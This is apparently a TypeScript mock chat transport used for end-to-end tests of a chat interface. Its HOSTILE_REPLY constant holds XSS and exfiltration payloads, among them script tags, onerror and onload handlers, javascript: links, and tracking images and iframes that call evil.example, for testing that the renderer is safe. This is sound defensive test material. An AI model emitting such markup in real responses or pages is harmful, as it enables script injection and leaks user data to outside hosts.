// SPDX-License-Identifier: Apache-2.0
import type { HarnessEvent, TurnLimit } from "@opa/core";
import type { ChatTransport } from "./transport";

const REPLY =
  "This is a placeholder reply. The assistant isn't connected yet, so every message gets this " +
  "answer, streamed a word at a time.";

/**
 * Sending exactly this gets hostile Markdown back, for the exfil-safe rendering test (M3-10 AC3).
 * Every remote URL is on `evil.example`; every script sets `window.pwned`.
 */
export const MOCK_HOSTILE = "/mock hostile markdown";
export const HOSTILE_REPLY = [
  "## Your summary",
  "Here is **bold**, `code` and [the docs](https://docs.example/guide).",
  "![tracker](https://evil.example/pixel.png?q=secret) ![svg](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20onload='window.pwned=1'/%3E) ![rel](//evil.example/r.png)",
  "[click me](javascript:window.pwned=1) [data](data:text/html,<script>window.pwned=1</script>) <https://evil.example/auto>",
  '<img src="https://evil.example/raw.png" onerror="window.pwned=1"><script>window.pwned=1</script>',
  '<svg onload="window.pwned=1"><image href="https://evil.example/s.png"/></svg><iframe src="https://evil.example/f"></iframe>',
  '<a href="https://evil.example/x" style="background:url(https://evil.example/bg.png)">styled</a>',
  "| Item | Cost |\n| --- | --- |\n| Lunch | $12 |",
  "```html\n<img src=https://evil.example/code.png onerror=window.pwned=1>\n```",
].join("\n\n");

/** Sending exactly one of these gets that limit's refusal instead of a reply. */
export const MOCK_LIMITS = new Map<string, TurnLimit>([
  ["/mock slow down", "slow_down"],
  ["/mock limit reached", "limit_reached"],
]);
/** Sending exactly this gets the refusal for saved keys that no longer open (TWO-650). */
export const MOCK_VAULT_RESET = "/mock vault reset";
/** Sending exactly this holds the turn's start for a second, as a slow server would. */
export const MOCK_SLOW_START = "/mock slow start";
const LIMIT_MESSAGES: Record<TurnLimit, string> = {
  slow_down: "You're sending messages quickly. Wait a minute, then try again.",
  limit_reached: "You've reached today's spending limit. It resets at midnight UTC.",
};

/** Streams a canned reply a word at a time, for the e2e tests and `vite dev` without a Worker. */
export function createMockTransport(delayMs = 30): ChatTransport {
  let turns = 0;
  let seq = 0; // one counter, as the server's per-conversation `seq` never restarts per turn
  let onEvent: (event: HarnessEvent) => void = () => {};
  let stop: (() => void) | null = null;
  return {
    connect(handle, onOpen) {
      onEvent = handle;
      queueMicrotask(onOpen);
      return () => {
        onEvent = () => {};
      };
    },
    send(sessionId, text) {
      // Lets the e2e tests and `vite dev` show the limit states (M2-22).
      const reason = MOCK_LIMITS.get(text);
      if (reason) {
        const payload = { message: LIMIT_MESSAGES[reason], reason };
        const event = { v: 1, seq: 0, sessionId, turnId: "", type: "turn.failed", payload };
        return queueMicrotask(() => onEvent(event as HarnessEvent));
      }
      if (text === MOCK_VAULT_RESET) {
        const payload = {
          message:
            "Your saved keys can't be opened. Reset them in Settings, then enter your key again.",
          code: "vault_reset_required",
        };
        const event = { v: 1, seq: 0, sessionId, turnId: "", type: "turn.failed", payload };
        return queueMicrotask(() => onEvent(event as HarnessEvent));
      }
      const turnId = `mock-${++turns}`;
      const emit = (type: HarnessEvent["type"], payload = {}) =>
        onEvent({ v: 1, seq: ++seq, sessionId, turnId, type, payload } as HarnessEvent);
      const reply = text === MOCK_HOSTILE ? HOSTILE_REPLY : REPLY;
      const words = reply.split(/(?<= )/);
      let timer: ReturnType<typeof setTimeout> | undefined;
      const tick = () => {
        const text = words.shift();
        if (text === undefined) {
          stop = null;
          emit("message.completed", { text: reply });
          return emit("turn.completed");
        }
        emit("message.delta", { text });
        timer = setTimeout(tick, delayMs);
      };
      let started = false;
      const begin = () => {
        started = true;
        emit("turn.started", { messageId: `${turnId}-reply` });
      };
      stop = () => {
        clearTimeout(timer);
        stop = null;
        // A turn stopped before its start still starts, so the tab can match the cancellation.
        if (!started) begin();
        emit("turn.cancelled");
      };
      const start = () => {
        begin();
        timer = setTimeout(tick, delayMs);
      };
      if (text === MOCK_SLOW_START) timer = setTimeout(start, 1000);
      else start();
    },
    cancel: () => stop?.(),
    conversations: async () => [],
    messages: async () => null,
  };
}
